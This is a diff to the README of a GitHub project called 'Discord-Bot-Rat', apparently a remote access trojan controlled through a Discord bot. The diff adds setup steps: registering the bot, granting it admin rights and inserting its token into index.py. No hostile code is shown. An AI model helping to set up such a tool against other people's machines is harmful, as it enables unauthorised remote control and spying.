@@ -25,8 +25,9 @@ This tool is for educational use only, the author will not be held responsible f
 ```
 
 # Instructions:
+You first need to register a bot at the Discord developer portal and then add the bot to a Discord server to control the program (Make sure that the bot has admin privileges in the Discord server). Once created, copy the token from the portal and replace it with the text "REPLACE_WITH_YOUR_TOKEN" with your token which is located at the very bottom of the index.py file. 
 1. Clone/Download the current repository "https://github.com/VincentDev21/Discord-Bot-Rat"
-2. Install Requirements
+3. Install Requirements
   ```
   pip install -r requirements.txt
   ```
